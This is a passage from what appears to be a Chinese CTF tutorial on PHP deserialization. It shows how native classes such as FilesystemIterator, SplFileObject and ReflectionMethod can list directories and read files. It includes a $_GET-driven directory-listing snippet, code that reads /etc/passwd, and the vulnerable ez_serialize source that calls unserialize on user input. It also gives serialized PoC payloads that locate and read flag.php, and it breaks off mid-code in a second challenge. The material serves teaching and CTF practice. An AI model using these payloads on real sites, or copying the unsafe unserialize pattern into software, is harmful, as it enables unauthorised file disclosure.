<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">其中cmd=<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="comment">$a = new FilesystemIterator(&quot;/*&quot;);foreach($a as $f)&#123;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure>
<p>前面都是读取文件目录，下面是可以读取文件内容</p>
<h4 id="可读取文件类"><a class="markdownIt-Anchor" href="#可读取文件类"></a> 可读取文件类</h4>
<h5 id="splfileobject-类"><a class="markdownIt-Anchor" href="#splfileobject-类"></a> SplFileObject 类</h5>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">官方文档</a></p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作</p>
<p>测试：</p>
<p>读取文件的一行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure>
<p>对文件中的每一行内容进行遍历</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="极客大挑战-soezunser"><a class="markdownIt-Anchor" href="#极客大挑战-soezunser"></a> 极客大挑战-SoEzUnser</h5>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121664208">博客推荐</a></p>
<h5 id="2021-mar-dasctf-明御攻防赛ez_serialize"><a class="markdownIt-Anchor" href="#2021-mar-dasctf-明御攻防赛ez_serialize"></a> [2021 MAR DASCTF 明御攻防赛]ez_serialize</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">B</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">ctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()    // 可以直接绕过<span class="title">__wakeup</span>()方法的执行</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">bad</span> <span class="title">hacker</span>~&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是一样的，先代码审计，发现没有什么危险函数的利用，我们可以利用原生类来利用了</p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
<p>然后进入这个文件夹</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>看到flag.php</p>
<p>现在我们只需要读取文件内容，利用<code>SplFileObject类</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure>
<p>能否利用原生类读取文件内容和文件目录？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para)</span><br></pre></td></tr></table></figure>
<p>这行代码比较关键，就是能否利用原生类的关键</p>
<h4 id="使用-reflectionmethod-类获取类方法的相关信息"><a class="markdownIt-Anchor" href="#使用-reflectionmethod-类获取类方法的相关信息"></a> 使用 ReflectionMethod 类获取类方法的相关信息</h4>
<h5 id="reflectionmethod"><a class="markdownIt-Anchor" href="#reflectionmethod"></a> ReflectionMethod</h5>
<p><strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionFunctionAbstract</span> <span class="keyword">implements</span> <span class="title">Reflector</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    	</span><br><span class="line"><span class="comment">/*方法*/</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__construct</span> — ReflectionMethod 的构造函数</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">export</span> — 输出一个回调方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getClosure</span> — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getDeclaringClass</span> — 获取被反射的方法所在类的反射实例</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getModifiers</span> — 获取方法的修饰符</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">getPrototype</span> — 返回方法原型 (如果存在)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invoke</span> — Invoke</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">invokeArgs</span> — 带参数执行</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isAbstract</span> — 判断方法是否是抽象方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isConstructor</span> — 判断方法是否是构造方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isDestructor</span> — 判断方法是否是析构方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isFinal</span> — 判断方法是否定义 <span class="keyword">final</span></span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPrivate</span> — 判断方法是否是私有方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isProtected</span> — 判断方法是否是保护方法 (<span class="keyword">protected</span>)</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isPublic</span> — 判断方法是否是公开方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">isStatic</span> — 判断方法是否是静态方法</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">setAccessible</span> — 设置方法是否访问</span><br><span class="line">    <span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span> — 返回反射方法对象的字符串表达</span><br><span class="line">        </span><br><span class="line"><span class="comment">/*继承的方法*/</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__clone</span>(): <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getAttributes</span>(?<span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureScopeClass</span>(): ?ReflectionClass</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getClosureThis</span>(): <span class="keyword">object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getDocComment</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getEndLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtension</span>(): ReflectionExtension</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getExtensionName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getFileName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNamespaceName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getNumberOfRequiredParameters</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getParameters</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getReturnType</span>(): ?ReflectionType</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getShortName</span>(): <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStartLine</span>(): <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">getStaticVariables</span>(): <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">hasReturnType</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">inNamespace</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isClosure</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isDeprecated</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isGenerator</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isInternal</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isUserDefined</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">isVariadic</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">returnsReference</span>(): <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="title class_">ReflectionFunctionAbstract</span>::<span class="title function_ invoke__">__toString</span>(): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<p>ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容，如下图所示（借用下图）</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4bed8c444b5d6640cfde958fa1b83753-166727395787411.png" alt="image-20210516101052113"></p>
<h5 id="2021-ciscneasy_source"><a class="markdownIt-Anchor" href="#2021-ciscneasy_source"></a> [2021 CISCN]easy_source</h5>
<p>先看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    